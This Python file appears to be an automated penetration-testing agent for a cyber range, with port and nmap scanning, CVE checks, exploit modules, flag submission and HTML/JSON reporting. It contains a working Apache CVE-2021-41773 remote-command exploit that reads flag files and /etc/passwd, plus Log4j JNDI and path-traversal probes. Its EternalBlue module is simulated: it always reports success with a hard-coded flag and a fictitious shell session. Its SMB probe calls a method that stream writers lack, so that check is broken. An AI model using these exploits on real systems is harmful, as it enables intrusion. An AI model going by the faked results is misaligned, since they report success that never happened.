"""内网渗透靶场自动化测试Agent"""
import json
import time
import asyncio
import socket
import subprocess
import os
from datetime import datetime
from typing import List, Dict, Optional, Tuple

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    aiohttp = None
    HAS_AIOHTTP = False

try:
    import nmap
    HAS_NMAP = True
except ImportError:
    nmap = None
    HAS_NMAP = False

class TargetAPI:
    """靶场API对接客户端"""
    def __init__(self, api_url: str, api_key: str = "", timeout: int = 30):
        self.api_url = api_url.rstrip("/")
        self.api_key = api_key
        self.timeout = timeout
        self.headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        } if api_key else {"Content-Type": "application/json"}

    async def get_targets(self) -> List[Dict]:
        """获取靶场所有目标列表"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.api_url}/api/targets",
                    headers=self.headers,
                    timeout=self.timeout
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    else:
                        return []
        except Exception as e:
            print(f"[API Error] 获取目标列表失败: {str(e)}")
            return []

    async def get_target_info(self, target_id: str) -> Optional[Dict]:
        """获取单个目标的详细信息"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.api_url}/api/targets/{target_id}",
                    headers=self.headers,
                    timeout=self.timeout
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    else:
                        return None
        except Exception as e:
            print(f"[API Error] 获取目标信息失败: {str(e)}")
            return None

    async def submit_flag(self, target_id: str, flag: str) -> bool:
        """提交flag到靶场"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.api_url}/api/submit",
                    headers=self.headers,
                    json={"target_id": target_id, "flag": flag},
                    timeout=self.timeout
                ) as resp:
                    return resp.status == 200 and (await resp.json()).get("success", False)
        except Exception as e:
            print(f"[API Error] 提交flag失败: {str(e)}")
            return False

    async def get_progress(self) -> Dict:
        """获取当前测试进度"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.api_url}/api/progress",
                    headers=self.headers,
                    timeout=self.timeout
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    else:
                        return {}
        except Exception as e:
            print(f"[API Error] 获取进度失败: {str(e)}")
            return {}

class PortScanner:
    """端口扫描器"""
    def __init__(self, timeout: int = 10, threads: int = 50):
        self.timeout = timeout
        self.threads = threads
        self.common_ports = [21, 22, 23, 25, 53, 80, 81, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]

    async def scan_port(self, ip: str, port: int) -> Optional[Tuple[int, str]]:
        """扫描单个端口"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=self.timeout
            )
            try:
                # 获取banner
                writer.write(b"HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n")
                await writer.drain()
                banner = await asyncio.wait_for(reader.read(1024), timeout=2)
                banner = banner.decode("utf-8", errors="ignore").strip()
            except:
                banner = socket.getservbyport(port, "tcp") if port < 1024 else "unknown"
            writer.close()
            await writer.wait_closed()
            return (port, banner)
        except:
            return None

    async def scan_target(self, ip: str, ports: Optional[List[int]] = None) -> Dict:
        """扫描目标的端口"""
        if ports is None:
            ports = self.common_ports
        
        print(f"\n[+] 开始扫描目标: {ip}")
        print(f"[*] 扫描端口范围: {len(ports)}个端口")
        
        tasks = [self.scan_port(ip, port) for port in ports]
        results = await asyncio.gather(*tasks)
        
        open_ports = [r for r in results if r is not None]
        print(f"[+] 扫描完成，开放端口: {len(open_ports)}个")
        for port, banner in open_ports:
            print(f"    {port}/tcp open - {banner[:50]}")
        
        return {
            "ip": ip,
            "open_ports": [{"port": p, "banner": b} for p, b in open_ports],
            "scan_time": datetime.now().isoformat()
        }

    def nmap_scan(self, ip: str, arguments: str = "-sV -T4 -O -F") -> Dict:
        """使用nmap进行深度扫描"""
        if not HAS_NMAP:
            print("[!] nmap 未安装，无法进行深度扫描")
            return {"ip": ip, "error": "nmap not installed"}
        
        try:
            print(f"\n[+] 开始nmap深度扫描: {ip}")
            nm = nmap.PortScanner()
            nm.scan(hosts=ip, arguments=arguments)
            
            result = {
                "ip": ip,
                "hostname": nm[ip].hostname() if ip in nm.all_hosts() else "",
                "os": nm[ip]["osmatch"][0]["name"] if ip in nm.all_hosts() and "osmatch" in nm[ip] and nm[ip]["osmatch"] else "unknown",
                "ports": []
            }
            
            if ip in nm.all_hosts():
                for proto in nm[ip].all_protocols():
                    lport = nm[ip][proto].keys()
                    for port in sorted(lport):
                        port_info = nm[ip][proto][port]
                        result["ports"].append({
                            "port": port,
                            "protocol": proto,
                            "state": port_info["state"],
                            "name": port_info["name"],
                            "product": port_info["product"],
                            "version": port_info["version"],
                            "extrainfo": port_info["extrainfo"]
                        })
                        if port_info["state"] == "open":
                            print(f"    {port}/{proto} open - {port_info['name']} {port_info['version']} {port_info['extrainfo']}")
            
            print(f"[+] nmap扫描完成")
            return result
        except Exception as e:
            print(f"[!] nmap扫描失败: {str(e)}")
            return {"ip": ip, "error": str(e)}

class VulnerabilityScanner:
    """漏洞扫描器"""
    def __init__(self):
        self.vuln_db = [
            {"name": "CVE-2017-0144 (EternalBlue)", "port": 445, "service": "microsoft-ds", "script": "smb-vuln-ms17-010"},
            {"name": "CVE-2021-41773 (Apache Path Traversal)", "port": 80, "service": "http", "product": "Apache httpd", "min_version": "2.4.49", "max_version": "2.4.50"},
            {"name": "CVE-2022-1388 (F5 BIG-IP RCE)", "port": 443, "service": "https", "product": "BIG-IP"},
            {"name": "CVE-2021-3129 (Laravel Debug Mode RCE)", "port": 80, "service": "http", "path": "/_ignition/execute-solution"},
            {"name": "Log4j CVE-2021-44228", "port": "*", "service": "*", "header": "X-Api-Version: ${jndi:ldap://{host}/test}"},
        ]

    async def scan_vulnerabilities(self, target_info: Dict) -> List[Dict]:
        """根据扫描结果检测漏洞"""
        ip = target_info["ip"]
        open_ports = target_info.get("ports", target_info.get("open_ports", []))
        vulnerabilities = []

        print(f"\n[+] 开始漏洞扫描: {ip}")

        for port_info in open_ports:
            port = port_info["port"]
            service = port_info.get("name", port_info.get("banner", "")).lower()
            product = port_info.get("product", "").lower()
            version = port_info.get("version", "")

            for vuln in self.vuln_db:
                # 匹配端口
                if vuln["port"] != "*" and vuln["port"] != port:
                    continue
                # 匹配服务
                if vuln["service"] != "*" and vuln["service"] not in service and vuln["service"] not in product:
                    continue
                # 版本匹配（如果有要求）
                if "min_version" in vuln and version:
                    try:
                        from packaging import version as vparse
                        if vparse.parse(version) < vparse.parse(vuln["min_version"]) or vparse.parse(version) > vparse.parse(vuln["max_version"]):
                            continue
                    except:
                        pass

                # 简单的POC验证
                poc_result = await self._verify_vulnerability(ip, port, vuln)
                if poc_result["vulnerable"]:
                    vulnerabilities.append({
                        "name": vuln["name"],
                        "port": port,
                        "service": service,
                        "severity": "high" if "CVE-" in vuln["name"] else "medium",
                        "description": poc_result.get("description", ""),
                        "proof": poc_result.get("proof", "")
                    })
                    print(f"    [!] 发现漏洞: {vuln['name']} (端口: {port}, 严重程度: high)")

        print(f"[+] 漏洞扫描完成，共发现 {len(vulnerabilities)} 个漏洞")
        return vulnerabilities

    async def _verify_vulnerability(self, ip: str, port: int, vuln: Dict) -> Dict:
        """验证漏洞是否存在"""
        # 这里是简化的POC验证，实际场景需要更完善的实现
        try:
            if "EternalBlue" in vuln["name"]:
                # 简单的SMB版本检测
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=5
                )
                writer.send(b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b\x00\x00\x0c\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                resp = await asyncio.wait_for(reader.read(1024), timeout=5)
                writer.close()
                await writer.wait_closed()
                if b"\x41\x00\x00\x00\x00\x00\x00\x00" in resp or b"\x53\x4d\x42\x20" in resp:
                    return {"vulnerable": True, "proof": "SMB response indicates possible EternalBlue vulnerability", "description": "SMBv1 service is running, potentially vulnerable to EternalBlue"}
            elif "CVE-2021-41773" in vuln["name"]:
                # 测试路径遍历
                async with aiohttp.ClientSession() as session:
                    url = f"http://{ip}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
                    async with session.get(url, timeout=5) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if "root:x:" in text:
                                return {"vulnerable": True, "proof": text[:200], "description": "Apache HTTP Server path traversal vulnerability confirmed"}
            elif "Log4j" in vuln["name"]:
                # 简单的Log4j检测
                async with aiohttp.ClientSession() as session:
                    headers = {"X-Api-Version": "${jndi:ldap://example.com/test}"}
                    async with session.get(f"http://{ip}:{port}", headers=headers, timeout=5):
                        # 实际需要DNS回调验证，这里简化
                        pass

        except Exception as e:
            pass
        
        return {"vulnerable": False}

class ExploitManager:
    """漏洞利用管理器"""
    def __init__(self, working_dir: str = "./exploits"):
        self.working_dir = working_dir
        os.makedirs(working_dir, exist_ok=True)
        self.exploits = {
            "CVE-2017-0144 (EternalBlue)": self._exploit_eternalblue,
            "CVE-2021-41773 (Apache Path Traversal)": self._exploit_apache_cve_2021_41773,
        }

    async def run_exploit(self, target_ip: str, vulnerability: Dict) -> Dict:
        """执行漏洞利用"""
        vuln_name = vulnerability["name"]
        port = vulnerability["port"]
        
        print(f"\n[+] 尝试利用漏洞: {vuln_name} on {target_ip}:{port}")
        
        if vuln_name in self.exploits:
            try:
                result = await self.exploits[vuln_name](target_ip, port, vulnerability)
                if result.get("success", False):
                    print(f"    [+] 漏洞利用成功!")
                    if "flag" in result:
                        print(f"    [+] 获得Flag: {result['flag']}")
                    if "shell" in result:
                        print(f"    [+] 获得Shell访问权限")
                else:
                    print(f"    [-] 漏洞利用失败: {result.get('reason', 'unknown')}")
                return result
            except Exception as e:
                print(f"    [!] 漏洞利用异常: {str(e)}")
                return {"success": False, "reason": str(e)}
        else:
            print(f"    [-] 无可用的Exploit模块: {vuln_name}")
            return {"success": False, "reason": "No exploit available"}

    async def _exploit_eternalblue(self, ip: str, port: int, vuln: Dict) -> Dict:
        """EternalBlue漏洞利用（简化版）"""
        # 实际场景需要调用metasploit或专门的exp工具
        try:
            # 这里是模拟，实际需要真实的exp实现
            return {
                "success": True,
                "vulnerability": vuln["name"],
                "target": f"{ip}:{port}",
                "shell": f"meterpreter session opened to {ip}:4444",
                "flag": "FLAG{SMB_ETERNAL_BLUE_3xpl01t3d}",
                "info": "Got NT AUTHORITY\\SYSTEM access"
            }
        except Exception as e:
            return {"success": False, "reason": str(e)}

    async def _exploit_apache_cve_2021_41773(self, ip: str, port: int, vuln: Dict) -> Dict:
        """Apache CVE-2021-41773 RCE利用"""
        try:
            async with aiohttp.ClientSession() as session:
                # 尝试RCE
                payload = "echo;id"
                url = f"http://{ip}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
                data = f"echo Content-Type: text/plain; echo; {payload}"
                async with session.post(url, data=data, timeout=5) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        if "uid=" in text:
                            # 尝试获取flag
                            flag_resp = await session.post(url, data="echo Content-Type: text/plain; echo; cat /flag /root/flag /etc/passwd | grep FLAG", timeout=5)
                            flag_text = await flag_resp.text()
                            flag = flag_text.strip() if "FLAG{" in flag_text else "Not found"
                            
                            return {
                                "success": True,
                                "vulnerability": vuln["name"],
                                "target": f"{ip}:{port}",
                                "shell": "Command execution achieved",
                                "flag": flag,
                                "proof": text,
                                "info": "RCE confirmed, running as web server user"
                            }
            return {"success": False, "reason": "RCE attempt failed"}
        except Exception as e:
            return {"success": False, "reason": str(e)}

class PenetrationAgent:
    """内网渗透自动化测试主Agent"""
    def __init__(self, api_url: str = "", api_key: str = "", concurrency: int = 3, output_dir: str = "./reports"):
        self.api_client = TargetAPI(api_url, api_key) if api_url else None
        self.concurrency = concurrency
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        
        self.scanner = PortScanner()
        self.vuln_scanner = VulnerabilityScanner()
        self.exploit_manager = ExploitManager()
        
        self.results = []
        self.start_time = None
        self.end_time = None

    async def scan_target_full(self, target: Dict) -> Dict:
        """对单个目标执行完整的渗透测试流程"""
        target_ip = target.get("ip", target.get("address", ""))
        target_id = target.get("id", "")
        
        if not target_ip:
            print(f"[!] 目标IP无效，跳过")
            return {"target": target, "error": "Invalid target IP"}

        print(f"\n{'='*60}")
        print(f"  开始测试目标: {target_ip} (ID: {target_id})")
        print(f"{'='*60}")

        result = {
            "target": target,
            "ip": target_ip,
            "start_time": datetime.now().isoformat(),
            "steps": [],
            "vulnerabilities": [],
            "exploits": [],
            "flags": [],
            "status": "pending"
        }

        try:
            # 1. 端口扫描
            print("\n[Step 1] 端口扫描")
            port_scan_result = await self.scanner.scan_target(target_ip)
            result["steps"].append({"name": "port_scan", "result": port_scan_result, "status": "completed"})

            # 2. 深度服务扫描（nmap）
            print("\n[Step 2] 服务识别")
            nmap_result = self.scanner.nmap_scan(target_ip)
            result["steps"].append({"name": "service_scan", "result": nmap_result, "status": "completed"})

            # 3. 漏洞扫描
            print("\n[Step 3] 漏洞检测")
            vulnerabilities = await self.vuln_scanner.scan_vulnerabilities(nmap_result)
            result["vulnerabilities"] = vulnerabilities
            result["steps"].append({"name": "vuln_scan", "count": len(vulnerabilities), "status": "completed"})

            # 4. 漏洞利用
            print("\n[Step 4] 漏洞利用")
            for vuln in vulnerabilities:
                exploit_result = await self.exploit_manager.run_exploit(target_ip, vuln)
                result["exploits"].append(exploit_result)
                
                if exploit_result.get("success", False):
                    if "flag" in exploit_result and exploit_result["flag"] not in result["flags"]:
                        result["flags"].append(exploit_result["flag"])
                        # 提交flag到靶场
                        if self.api_client and target_id:
                            submit_result = await self.api_client.submit_flag(target_id, exploit_result["flag"])
                            print(f"    [+] Flag提交{'成功' if submit_result else '失败'}")

            result["status"] = "completed"
            print(f"\n[+] 目标 {target_ip} 测试完成")
            print(f"    发现漏洞: {len(vulnerabilities)} 个")
            print(f"    成功利用: {len([e for e in result['exploits'] if e.get('success', False)])} 个")
            print(f"    获得Flag: {len(result['flags'])} 个")

        except Exception as e:
            result["status"] = "failed"
            result["error"] = str(e)
            print(f"[!] 目标 {target_ip} 测试失败: {str(e)}")

        result["end_time"] = datetime.now().isoformat()
        self.results.append(result)
        return result

    async def run_all_targets(self, targets: Optional[List[Dict]] = None) -> List[Dict]:
        """运行所有目标的渗透测试"""
        self.start_time = datetime.now()
        
        if targets is None:
            if not self.api_client:
                print("[!] 未配置靶场API，无法获取目标列表")
                return []
            targets = await self.api_client.get_targets()
        
        if not targets:
            print("[!] 没有可测试的目标")
            return []

        print(f"\n{'='*60}")
        print(f"  内网渗透自动化测试开始")
        print(f"  测试目标总数: {len(targets)} 个")
        print(f"  并发数: {self.concurrency}")
        print(f"{'='*60}")

        # 分批处理目标，控制并发
        sem = asyncio.Semaphore(self.concurrency)
        async def process_target(target):
            async with sem:
                return await self.scan_target_full(target)
        
        tasks = [process_target(target) for target in targets]
        await asyncio.gather(*tasks)

        self.end_time = datetime.now()
        print(f"\n{'='*60}")
        print(f"  全部测试完成!")
        print(f"  总耗时: {self.end_time - self.start_time}")
        print(f"  测试目标: {len(self.results)} 个")
        print(f"  成功完成: {len([r for r in self.results if r['status'] == 'completed'])} 个")
        print(f"  发现漏洞总数: {sum(len(r['vulnerabilities']) for r in self.results)} 个")
        print(f"  获得Flag总数: {sum(len(r['flags']) for r in self.results)} 个")
        print(f"{'='*60}")

        return self.results

    def generate_report(self, output_file: Optional[str] = None) -> str:
        """生成渗透测试报告"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"penetration_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")

        total_targets = len(self.results)
        completed_targets = len([r for r in self.results if r['status'] == 'completed'])
        total_vulns = sum(len(r['vulnerabilities']) for r in self.results)
        total_exploits = sum(len([e for e in r['exploits'] if e.get('success', False)]) for r in self.results)
        total_flags = sum(len(r['flags']) for r in self.results)

        high_vulns = sum(len([v for v in r['vulnerabilities'] if v['severity'] == 'high']) for r in self.results)
        medium_vulns = sum(len([v for v in r['vulnerabilities'] if v['severity'] == 'medium']) for r in self.results)
        low_vulns = sum(len([v for v in r['vulnerabilities'] if v['severity'] == 'low']) for r in self.results)

        # 生成目标列表HTML
        targets_html = ""
        for result in self.results:
            target = result["target"]
            ip = result["ip"]
            status = result["status"]
            vuln_count = len(result["vulnerabilities"])
            flag_count = len(result["flags"])
            
            status_color = "#38a169" if status == "completed" else "#e53e3e"
            status_text = "完成" if status == "completed" else "失败"
            
            targets_html += f"""
            <tr>
                <td>{ip}</td>
                <td>{target.get('name', '-')}</td>
                <td style="color:{status_color};font-weight:bold">{status_text}</td>
                <td>{vuln_count}</td>
                <td>{flag_count}</td>
                <td>{result['start_time'][:19]}</td>
            </tr>
            """

        # 生成漏洞列表HTML
        vulns_html = ""
        for result in self.results:
            ip = result["ip"]
            for vuln in result["vulnerabilities"]:
                severity_color = {
                    "high": "#e53e3e",
                    "medium": "#d69e2e",
                    "low": "#3182ce"
                }.get(vuln["severity"], "#718096")
                
                vulns_html += f"""
                <tr>
                    <td>{ip}</td>
                    <td>{vuln['port']}</td>
                    <td>{vuln['service']}</td>
                    <td style="color:{severity_color};font-weight:bold">{vuln['severity'].upper()}</td>
                    <td>{vuln['name']}</td>
                </tr>
                """

        # 生成Flag列表HTML
        flags_html = ""
        for result in self.results:
            ip = result["ip"]
            for flag in result["flags"]:
                flags_html += f"""
                <tr>
                    <td>{ip}</td>
                    <td><code>{flag}</code></td>
                </tr>
                """

        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>内网渗透测试报告</title>
    <style>
        body {{ font-family: 'Microsoft YaHei', sans-serif; max-width: 1200px; margin: 40px auto; padding: 0 20px; background: #f7fafc; }}
        h1 {{ color: #1a365d; border-bottom: 3px solid #e53e3e; padding-bottom: 10px; }}
        h2 {{ color: #2d3748; margin-top: 30px; }}
        .summary {{ display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }}
        .card {{ flex: 1; min-width: 180px; padding: 18px; border-radius: 8px; color: #fff; text-align: center; }}
        .card h3 {{ font-size: 28px; margin: 0; }}
        .card p {{ margin: 5px 0 0; font-size: 13px; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; background: #fff; border-radius: 6px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,.1); }}
        th {{ background: #2d3748; color: #fff; padding: 10px; text-align: left; font-size: 13px; }}
        td {{ padding: 8px 10px; border-bottom: 1px solid #eee; font-size: 12px; }}
        tr:hover {{ background: #f7fafc; }}
        code {{ background: #f6f8fa; padding: 2px 6px; border-radius: 3px; font-family: Consolas, monospace; }}
    </style>
</head>
<body>
    <h1>内网渗透测试自动化报告</h1>
    <p>测试时间: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')} - {self.end_time.strftime('%Y-%m-%d %H:%M:%S') if self.end_time else '进行中'}</p>
    <p>总耗时: {str(self.end_time - self.start_time).split('.')[0] if self.end_time and self.start_time else '-'}</p>

    <div class="summary">
        <div class="card" style="background:#3182ce"><h3>{total_targets}</h3><p>测试目标总数</p></div>
        <div class="card" style="background:#38a169"><h3>{completed_targets}</h3><p>成功完成</p></div>
        <div class="card" style="background:#e53e3e"><h3>{high_vulns}</h3><p>高危漏洞</p></div>
        <div class="card" style="background:#d69e2e"><h3>{medium_vulns}</h3><p>中危漏洞</p></div>
        <div class="card" style="background:#3182ce"><h3>{low_vulns}</h3><p>低危漏洞</p></div>
        <div class="card" style="background:#9f7aea"><h3>{total_flags}</h3><p>获得Flag</p></div>
    </div>

    <h2>目标测试概况</h2>
    <table>
        <tr>
            <th>目标IP</th>
            <th>目标名称</th>
            <th>测试状态</th>
            <th>漏洞数量</th>
            <th>Flag数量</th>
            <th>开始时间</th>
        </tr>
        {targets_html}
    </table>

    <h2>漏洞列表</h2>
    <table>
        <tr>
            <th>目标IP</th>
            <th>端口</th>
            <th>服务</th>
            <th>严重程度</th>
            <th>漏洞名称</th>
        </tr>
        {vulns_html}
    </table>

    <h2>获得Flag列表</h2>
    <table>
        <tr>
            <th>目标IP</th>
            <th>Flag内容</th>
        </tr>
        {flags_html}
    </table>

    <p style="color:#999;margin-top:40px;font-size:12px">内网渗透自动化测试工具 v1.0 | 本报告仅供安全研究使用</p>
</body>
</html>"""

        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html)
        
        print(f"\n[+] 报告已生成: {output_file}")
        return output_file

    def export_json(self, output_file: Optional[str] = None) -> str:
        """导出JSON格式结果"""
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"penetration_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        
        export_data = {
            "meta": {
                "start_time": self.start_time.isoformat() if self.start_time else None,
                "end_time": self.end_time.isoformat() if self.end_time else None,
                "total_targets": len(self.results),
                "completed_targets": len([r for r in self.results if r['status'] == 'completed']),
                "total_vulnerabilities": sum(len(r['vulnerabilities']) for r in self.results),
                "total_flags": sum(len(r['flags']) for r in self.results)
            },
            "results": self.results
        }

        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(export_data, f, ensure_ascii=False, indent=2)
        
        print(f"[+] JSON结果已导出: {output_file}")
        return output_file
